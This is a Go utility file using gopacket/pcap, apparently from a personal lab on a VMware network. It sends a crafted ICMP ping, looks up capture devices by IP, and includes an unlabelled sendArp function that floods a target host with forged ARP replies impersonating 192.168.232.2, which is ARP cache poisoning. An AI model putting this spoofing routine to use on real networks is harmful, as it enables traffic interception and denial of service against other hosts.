package utils

import (
	"errors"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
	"time"
)

type NetworkDevice struct {
	Name        string
	Ip          net.IP
	Description string
}

func PostIcmp() {
	addr1 := &net.IPAddr{IP: net.ParseIP("0.0.0.0")}
	addr2 := &net.IPAddr{IP: net.ParseIP("192.168.232.144")}
	ip, err := net.DialIP("ip4:icmp", addr1, addr2)
	if err != nil {
		fmt.Println("错误:", err)
		return
	}
	info := "\x08\x00\x4d\x5a\x00\x01\x00" +
		"\x01\x61\x62\x63\x64\x65\x66\x67\x68" +
		"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71" +
		"\x72\x73\x74\x75\x76\x77\x61\x62\x63" +
		"\x64\x65\x66\x67\x68\x69"
	write, err := ip.Write([]byte(info))
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(write, "write")
	ip.Close()
}

func sendArp() {
	iface, err := net.InterfaceByName("VMware Network Adapter VMnet8")
	//fmt.Println(iface.Name, "iface.Name", iface.HardwareAddr, "iface.HardwareAddr")
	if err != nil {
		fmt.Println(err, 1)
		return
	}

	handle, err := pcap.OpenLive("\\Device\\NPF_{954BA663-E616-46D4-B747-52FCF493D58F}", 65536, true, pcap.BlockForever)
	if err != nil {
		fmt.Println(err, 2)
		return
	}
	eth := &layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       net.HardwareAddr{0x00, 0x0c, 0x29, 0x2f, 0xdd, 0xf2},
		EthernetType: layers.EthernetTypeARP,
	}
	a := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     uint8(6),
		ProtAddressSize:   uint8(4),
		Operation:         uint16(2),
		SourceHwAddress:   iface.HardwareAddr,
		SourceProtAddress: net.ParseIP("192.168.232.2").To4(),
		DstHwAddress:      net.HardwareAddr{0x00, 0x0c, 0x29, 0x8a, 0x8c, 0xef},
		DstProtAddress:    net.ParseIP("192.168.232.144").To4(),
	}

	buffer := gopacket.NewSerializeBuffer()
	var opt gopacket.SerializeOptions
	gopacket.SerializeLayers(buffer, opt, eth, a)
	outgoingPacket := buffer.Bytes()
	for {
		err = handle.WritePacketData(outgoingPacket)
		if err != nil {
			fmt.Println(err, 3)
		}
		time.Sleep(time.Microsecond * 100)
	}
}

func GetPcapDev(sourceIp string) (*NetworkDevice, error) {
	if !CheckIpv4(sourceIp) {
		return nil, errors.New("ip 错误")
	}
	ip := net.ParseIP(sourceIp)
	ifs, err := pcap.FindAllDevs()
	if err != nil {
		return nil, err
	}
	for _, v := range ifs {
		for _, address := range v.Addresses {
			if address.IP.Equal(ip) {
				dev := &NetworkDevice{
					Name:        v.Name,
					Ip:          ip,
					Description: v.Description,
				}
				return dev, nil
			}
		}
	}
	return nil, errors.New("网卡异常,没有匹配ip")
}
